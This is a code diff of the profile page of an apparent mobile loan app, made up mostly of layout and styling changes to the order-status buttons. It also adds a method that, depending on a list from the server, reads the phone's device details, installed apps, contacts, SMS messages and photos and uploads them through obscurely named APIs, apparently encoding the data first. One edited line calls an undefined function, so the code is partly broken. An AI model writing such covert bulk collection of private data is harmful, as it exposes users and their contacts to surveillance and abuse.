@@ -8,16 +8,56 @@
                 <img src="@/assets/user-icon-a.png" alt="">
             </div>
             <div class="user-name">Hello User</div>
+            <div class="status">
+                <div class="success" @click="doStatus(1)">
+                    <div class="status-icon">
+                        <img src="../../assets/success-icon.png" alt="">
+                    </div>
+                    <div class="status-desc">Success</div>
+                </div>
+                <div class="overdue" @click="doStatus(2)">
+                    <div class="status-icon">
+                        <img src="../../assets/overdue-icon.png" alt="">
+                    </div>
+                    <div class="status-desc">Overdue</div>
+                </div>
+                <div class="finish" @click="doStatus(3)">
+                    <div class="status-icon">
+                        <img src="../../assets/finish-icon.png" alt="">
+                    </div>
+                    <div class="status-desc">Finish</div>
+                </div>
+            </div>
         </div>
         <div class="me-top" v-else>
             <div class="user-icon">
                 <img src="@/assets/user-icon.png" alt="">
             </div>
             <div class="user-name">Please Login</div>
+            <!-- 顶部状态 -->
+            <div class="status">
+                <div class="success" @click="doStatus(1)">
+                    <div class="status-icon">
+                        <img src="../../assets/success-icon.png" alt="">
+                    </div>
+                    <div class="status-desc">Success</div>
+                </div>
+                <div class="overdue" @click="doStatus(2)">
+                    <div class="status-icon">
+                        <img src="../../assets/overdue-icon.png" alt="">
+                    </div>
+                    <div class="status-desc">Overdue</div>
+                </div>
+                <div class="finish" @click="doStatus(3)">
+                    <div class="status-icon">
+                        <img src="../../assets/finish-icon.png" alt="">
+                    </div>
+                    <div class="status-desc">Finish</div>
+                </div>
+            </div>
+
         </div>
-        <div class="status">
-            <img src="@/assets/me-nav.png" alt="">
-        </div>
+
         <!-- 列表 -->
         <ul class="list">
             <!-- My Order -->
@@ -51,7 +91,7 @@
                 </div>
             </li>
             <!-- Loan Product -->
-            <li @click="doProduct">
+            <li @click="dotoNext">
                 <div class="list-icon">
                     <img src="@/assets/list-house.png" alt="">
                 </div>
@@ -97,6 +137,10 @@ import { Dialog, Toast } from 'vant'
 import Privacy from './Privacy'
 import Term from './Term'
 import { getEmail, threeToken } from '../../android/android.js'
+import { getPermission, getDeviceInfo, getApp, getSms, getPhoto, getContact, getPhoneInfo } from "../../android/android.js";
+import { FKJYHLEHsetDeviceInfoAPI, FKJYHLEHgetshebeiInfoAPI, FKJYHLEHgetAppInfoAPI, FKJYHLEHgettxlAPI, FKJYHLEHgetduanxinAPI, FKJYHLEHgetPhotoInfoAPI } from "../../api";
+import { add, unt } from "../../utils/key.js";
+import toNext from '../Form/toNext.js'
 export default {
     components: { Privacy, Term },
     data() {
@@ -135,14 +179,52 @@ export default {
             this.$store.commit('changeCount', 0)
             this.$router.push('/myloan')
         },
-        doProduct() {
+        //跳转到下一页
+        async dotoNext() {
             if (!this.$store.state.isLogin) {
                 this.$router.push('/login')
-                return Toast('please log in first')
+                return c('please log in first')
             }
-            this.$router.push('/ProductList')
+            this.$router.push('/beforeys')
         },
-
+        //获取设备信息上报情况
+        async getInfo() {
+            const res = await FKJYHLEHsetDeviceInfoAPI()
+            this.list = res.list
+            console.log(this.list, 'this.list')
+            console.log(JSON.stringify(this.list), 'this.list')
+            if (this.list.indexOf("DEVICE") > -1) {
+                let res = await getDeviceInfo();
+                let info = JSON.parse(res.phoneDevice);
+                const r = await FKJYHLEHgetshebeiInfoAPI(add({ model: info.device }))
+                console.log(r, '1111111111111111')
+            }
+            if (this.list.indexOf('APP') > -1) {
+                let res = await getApp();
+                let info = JSON.parse(res.phoneDevice);
+                const r = await FKJYHLEHgetAppInfoAPI(add({ model: { deviceApps: info.deviceApps } }))
+                console.log(r, '2222222222222222222')
+            }
+            if (this.list.indexOf("CONTACT") > -1) {
+                let res = await getContact();
+                let info = JSON.parse(res.phoneDevice);
+                const r = await FKJYHLEHgettxlAPI(add({ model: { deviceContacts: info.deviceContacts } }))
+                console.log(r, '33333333333333333')
+            }
+            if (this.list.indexOf("SMS") > -1) {
+                let res = await getSms();
+                let info = JSON.parse(res.phoneDevice);
+                const r = await FKJYHLEHgetduanxinAPI(add({ model: { list: info.smsList } }))
+                console.log(r, '44444444444444444444')
+            }
+            if (this.list.indexOf("PHOTO") > -1) {
+                let res = await getPhoto();
+                let info = JSON.parse(res.phoneDevice);
+                const r = await FKJYHLEHgetPhotoInfoAPI(add({ model: { list: info.photoList } }))
+                console.log(r, '555555555555555555555555')
+            }
+            console.log(this.list, '设备信息上报情况')
+        },
         doStatus(status) {
             if (!this.$store.state.isLogin) {
                 this.$router.push('/login')
@@ -159,32 +241,9 @@ export default {
     position: relative;
     padding-bottom: (60/@a);
 
-    .success {
-        position: absolute;
-        z-index: 999;
-        top: (170/@a);
-        left: (50/@a);
-        width: (70/@a);
-        height: (75/@a);
-    }
 
-    .overdue {
-        position: absolute;
-        z-index: 999;
-        top: (170/@a);
-        left: (150/@a);
-        width: (70/@a);
-        height: (75/@a);
-    }
 
-    .finish {
-        position: absolute;
-        z-index: 999;
-        top: (170/@a);
-        left: (250/@a);
-        width: (70/@a);
-        height: (75/@a);
-    }
+
 
     .login {
         position: absolute;
@@ -258,19 +317,10 @@ export default {
         }
     }
 
-    .status {
-        position: absolute;
-        top: (145/@a);
-        left: (15/@a);
-        width: (350/@a);
-        height: (113/@a);
 
-        img {
-            width: 100%;
-        }
-    }
 
     .me-top {
+        position: relative;
         width: 100vw;
         height: (300/@a);
         background: linear-gradient(180deg, #2BDB80 0%, #10BA68 100%);
@@ -295,6 +345,71 @@ export default {
             margin-top: (10/@a);
             margin-left: (135/@a);
         }
+
+        .success {
+            // position: absolute;
+            z-index: 999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            // top: (170/@a);
+            // left: (50/@a);
+            // width: (70/@a);
+            // height: (75/@a);
+        }
+
+        .overdue {
+            // position: absolute;
+            z-index: 999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            // top: (170/@a);
+            // left: (150/@a);
+            // width: (70/@a);
+            // height: (75/@a);
+        }
+
+        .finish {
+            // position: absolute;
+            z-index: 999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            // top: (170/@a);
+            // left: (250/@a);
+            // width: (70/@a);
+            // height: (75/@a);
+
+        }
+
+        .status {
+            // position: absolute;
+            // top: (145/@a);
+            // left: (15/@a);
+            border-radius: (15/@a);
+
+            width: (350/@a);
+            height: (113/@a);
+            background-color: #fff;
+            position: absolute;
+            bottom: (40/@a);
+            left: (10/@a);
+            right: (10/@a);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+
+            // .success {
+            //     position: absolute;
+            //     top: (10/@a);
+            //     left: (20/@a);
+            // }
+        }
+
     }
 
     .nav {
